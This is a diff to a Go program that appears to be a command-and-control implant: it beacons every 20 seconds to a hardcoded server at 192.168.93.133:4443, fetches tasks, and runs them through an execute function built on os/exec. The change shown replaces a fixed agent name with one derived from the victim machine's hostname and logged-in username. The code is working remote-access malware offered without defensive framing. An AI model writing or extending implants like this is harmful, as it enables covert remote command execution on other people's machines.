@@ -5,7 +5,9 @@ import (
 	"io"
 	"net/http"
 	"net/url"
+	"os"
 	"os/exec"
+	usr "os/user"
 	"regexp"
 	"strings"
 	"time"
@@ -13,9 +15,44 @@ import (
 
 const (
 	server     = "https://192.168.93.133:4443"
-	agentID    = "agent01"
 	beaconFreq = 20 * time.Second
 )
+
+var agentID string
+
+func deriveAgentID() string {
+	host, _ := os.Hostname()
+	candidate := strings.ToLower(strings.TrimSpace(host))
+	if candidate == "" {
+		candidate = "unknown"
+	}
+	// get current username cross-platform
+	username := ""
+	if u, err := usr.Current(); err == nil {
+		username = u.Username
+	}
+	if username == "" {
+		username = os.Getenv("USER")
+	}
+	if username == "" {
+		username = os.Getenv("USERNAME")
+	}
+	username = strings.ToLower(strings.TrimSpace(username))
+	if username == "" {
+		username = "user"
+	}
+	// Windows may include DOMAIN\\User; keep only right side
+	if strings.Contains(username, "\\") {
+		parts := strings.Split(username, "\\")
+		username = parts[len(parts)-1]
+	}
+	// combine host-user
+	combined := candidate + "-" + username
+	// allow a-z, 0-9, underscore, hyphen; replace others with '-'
+	re := regexp.MustCompile(`[^a-z0-9_-]`)
+	combined = re.ReplaceAllString(combined, "-")
+	return combined
+}
 
 var client = &http.Client{
 	Transport: &http.Transport{
@@ -58,6 +95,7 @@ func execute(cmd string) string {
 }
 
 func main() {
+	agentID = deriveAgentID()
 	for {
 		task := fetchTask()
 		if task != "" {
